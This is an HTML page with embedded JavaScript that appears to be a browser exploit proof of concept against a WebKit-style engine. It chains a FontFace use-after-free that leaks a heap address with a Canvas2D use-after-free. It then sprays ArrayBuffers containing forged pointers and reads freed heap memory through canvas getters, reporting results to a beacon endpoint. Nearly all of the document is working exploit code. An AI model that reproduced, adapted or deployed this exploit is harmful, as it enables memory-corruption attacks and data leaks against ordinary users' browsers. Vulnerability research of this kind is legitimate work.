<!--
  p649e: Canvas2D hybrid forge — split pattern for Vector<State,1> layout

  Problem: Vector<State,1> has m_buffer at +0x00 but m_size at +0x10+sizeof(State)
  (~600B later). A uniform {T,1|1} repeat puts wrong values at m_size.

  Fix: SPLIT pattern
    Bytes 0-127: {T, 1|1} or {1|1, T} (try both via sessionStorage retry)
    Bytes 128-767: every dword = 0x00000001

  This ensures:
    - m_buffer = T (in the first zone, at the right 16B alignment)
    - m_size = 1 (in the second zone, always)

  lineWidth getter: m_stateStack.last().lineWidth
    = m_buffer[(m_size-1) * sizeof(State) + lineWidth_offset]
    = T + 0 + lineWidth_offset
    = reads double from freed HashTable heap memory (bmalloc, still mapped)

  CRASH_CLASS: HIGH — reads through forged pointer
-->
<!DOCTYPE html><html><head><meta charset="utf-8"><title>p649e</title></head>
<body>p649e: hybrid forge
<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
<script>
(function() {
'use strict';
var L = document.getElementById('log');
var bQ = [];
var retained = [];

function emit(tag, msg) {
  var s = tag + (msg ? ' ' + msg : '');
  L.textContent += s + '\n';
  bQ.push(s);
  if (bQ.length >= 2) flush();
}
function flush() {
  if (!bQ.length) return;
  var b = bQ.splice(0, 4).join('|');
  try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P649E-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
}
window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };

var f64 = new Float64Array(1);
var u8f = new Uint8Array(f64.buffer);
function d2hex(d) {
  f64[0] = d;
  var h = '';
  for (var i = 7; i >= 0; i--) h += ('0' + u8f[i].toString(16)).slice(-2);
  return h;
}
function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

// Pattern selection: A (even alignment) or B (odd alignment)
// Use sessionStorage to retry with B if A crashes
var attempt = 'A';
try {
  var prev = sessionStorage.getItem('p649e_attempt');
  if (prev === 'A') attempt = 'B';
  else if (prev === 'B') attempt = 'C';  // both failed
  sessionStorage.setItem('p649e_attempt', attempt);
} catch(e) {}

emit('START', 'attempt=' + attempt + ' ' + (navigator.userAgent ? navigator.userAgent.slice(0,50) : ''));
flush();

if (attempt === 'C') {
  emit('BOTH-FAILED', 'patterns A and B both crashed — need different approach');
  flush();
  try { sessionStorage.removeItem('p649e_attempt'); } catch(e) {}
  return;
}

// ================================================================
// PHASE 1: FontFace UAF → leak heap address T
// ================================================================
var ffA = new FontFace('ff0', 'local(Helvetica)', { unicodeRange: 'U+0041' });
document.fonts.add(ffA);
void ffA.loaded;
retained.push(ffA);

var ffStyle = document.createElement('style');
ffStyle.textContent = "@font-face { font-family: ffs0; src: local(Arial); unicode-range: U+0042; }";
document.head.appendChild(ffStyle);

var ffFired = false;
var ffBufs = [];
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffFired) return undefined;
    ffFired = true;
    ffStyle.remove();
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;
    for (var i = 0; i < 64; i++) {
      var ab = new ArrayBuffer(192);
      ffBufs.push(new Uint8Array(ab));
    }
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em ff0, ffs0', 'AB');

setTimeout(function() {
try {
  var T_lo = 0, T_hi = 0;
  var ffHit = -1;

  for (var i = 0; i < ffBufs.length; i++) {
    var v = ffBufs[i];
    var nonzero = 0;
    for (var j = 0; j < 192; j++) if (v[j] !== 0) nonzero++;
    if (nonzero > 0) {
      ffHit = i;
      var dv = new DataView(v.buffer);
      T_lo = dv.getUint32(0x58, true);
      T_hi = dv.getUint32(0x5C, true);
      emit('FF-HIT', 'T=0x' + hex32(T_hi) + hex32(T_lo));
      break;
    }
  }
  if (ffHit < 0) {
    emit('FF-MISS', 'ABORT');
    flush();
    return;
  }
  flush();

  // ================================================================
  // PHASE 2: Canvas2D UAF — DETACHED canvas
  // ================================================================
  var uafCanvas = document.createElement('canvas');
  uafCanvas.width = 1; uafCanvas.height = 1;

  var innerCtx = null;
  var gFired = false;
  var cvOpts = {};
  Object.defineProperty(cvOpts, 'alpha', {
    get: function() {
      gFired = true;
      innerCtx = uafCanvas.getContext('2d');
      return true;
    }
  });

  try { uafCanvas.getContext('bitmaprenderer', cvOpts); } catch(e) {}

  emit('CV-UAF', 'ok=' + gFired);
  flush();
  if (!innerCtx) { emit('ABORT', 'no ctx'); flush(); return; }

  // ================================================================
  // PHASE 3: HYBRID AB(768) spray
  //
  // Zone 1 (bytes 0-127): pointer pattern for m_buffer coverage
  //   Pattern A: {T(8B), 1(4B), 1(4B)} per 16B — m_buffer=T at even 16B offsets
  //   Pattern B: {1(4B), 1(4B), T(8B)} per 16B — m_buffer=T at odd 8B offsets
  //
  // Zone 2 (bytes 128-767): every dword = 1
  //   m_size will be here (at ~0x250-0x2A0) and always reads 1
  // ================================================================
  var AB_N = 300;
  var abViews = [];

  var tmpl = new ArrayBuffer(768);
  var tmplDV = new DataView(tmpl);
  var tmplU8 = new Uint8Array(tmpl);

  // Zone 2: fill everything with dword=1
  for (var off = 0; off < 768; off += 4) {
    tmplDV.setUint32(off, 1, true);
  }

  // Zone 1: overwrite first 128 bytes with pointer pattern
  if (attempt === 'A') {
    // Pattern A: T at 0, 16, 32, 48, 64, 80, 96, 112
    for (var off = 0; off < 128; off += 16) {
      tmplDV.setUint32(off + 0, T_lo, true);
      tmplDV.setUint32(off + 4, T_hi, true);
      tmplDV.setUint32(off + 8, 1, true);
      tmplDV.setUint32(off + 12, 1, true);
    }
  } else {
    // Pattern B: T at 8, 24, 40, 56, 72, 88, 104, 120
    for (var off = 0; off < 128; off += 16) {
      tmplDV.setUint32(off + 0, 1, true);
      tmplDV.setUint32(off + 4, 1, true);
      tmplDV.setUint32(off + 8, T_lo, true);
      tmplDV.setUint32(off + 12, T_hi, true);
    }
  }

  for (var i = 0; i < AB_N; i++) {
    var ab = new ArrayBuffer(768);
    new Uint8Array(ab).set(tmplU8);
    abViews.push(new Uint8Array(ab));
    retained.push(ab);
  }

  emit('SPRAY', AB_N + ' hybrid-' + attempt);
  flush();

  // ================================================================
  // PHASE 4: GETTER-ONLY reads
  // ================================================================
  emit('G', 'lineWidth');
  flush();
  var lwOk = false;
  try {
    var lw = innerCtx.lineWidth;
    lwOk = true;
    emit('LW', lw + ' h=' + d2hex(lw));
  } catch(e) {
    emit('LW', 'EXC:' + String(e).slice(0,40));
  }
  flush();

  if (lwOk) {
    // Success! Clear retry flag
    try { sessionStorage.removeItem('p649e_attempt'); } catch(e) {}

    emit('G', 'miterLimit');
    flush();
    try { emit('ML', innerCtx.miterLimit + ' h=' + d2hex(innerCtx.miterLimit)); } catch(e) { emit('ML', 'X'); }

    emit('G', 'globalAlpha');
    flush();
    try { emit('GA', innerCtx.globalAlpha + ' h=' + d2hex(innerCtx.globalAlpha)); } catch(e) { emit('GA', 'X'); }

    emit('G', 'getTransform');
    flush();
    try {
      var t = innerCtx.getTransform();
      emit('XF', 'a=' + d2hex(t.a) + ' b=' + d2hex(t.b) + ' c=' + d2hex(t.c));
      emit('XF', 'd=' + d2hex(t.d) + ' e=' + d2hex(t.e) + ' f=' + d2hex(t.f));
    } catch(e) { emit('XF', 'X:' + String(e).slice(0,40)); }

    emit('G', 'shadowBlur');
    flush();
    try { emit('SB', innerCtx.shadowBlur + ' h=' + d2hex(innerCtx.shadowBlur)); } catch(e) { emit('SB', 'X'); }

    try {
      emit('SOX', innerCtx.shadowOffsetX + ' h=' + d2hex(innerCtx.shadowOffsetX));
      emit('SOY', innerCtx.shadowOffsetY + ' h=' + d2hex(innerCtx.shadowOffsetY));
    } catch(e) { emit('SO', 'X'); }

    try { emit('LDO', innerCtx.lineDashOffset + ' h=' + d2hex(innerCtx.lineDashOffset)); } catch(e) { emit('LDO', 'X'); }
    flush();

    // Repeat lineWidth 3x to check determinism
    try {
      var lw2 = innerCtx.lineWidth;
      var lw3 = innerCtx.lineWidth;
      emit('DET', 'lw2=' + d2hex(lw2) + ' lw3=' + d2hex(lw3) + ' same=' + (d2hex(lw) === d2hex(lw2)));
    } catch(e) { emit('DET', 'X'); }
    flush();

    // Phase 5: scan ABs for any engine modifications
    var modAB = -1;
    for (var ai = 0; ai < abViews.length; ai++) {
      var v = abViews[ai];
      for (var off = 0; off < 768; off++) {
        if (v[off] !== tmplU8[off]) {
          modAB = ai;
          break;
        }
      }
      if (modAB >= 0) break;
    }
    emit('MOD', modAB >= 0 ? 'AB[' + modAB + '] modified' : 'no mods');
    flush();
  }

  emit('ALIVE', attempt + ' ' + (lwOk ? 'FORGE-OK' : 'getter-failed'));
  flush();

} catch(topErr) { emit('FATAL', String(topErr).slice(0,200)); flush(); }
}, 250);
})();
</script>
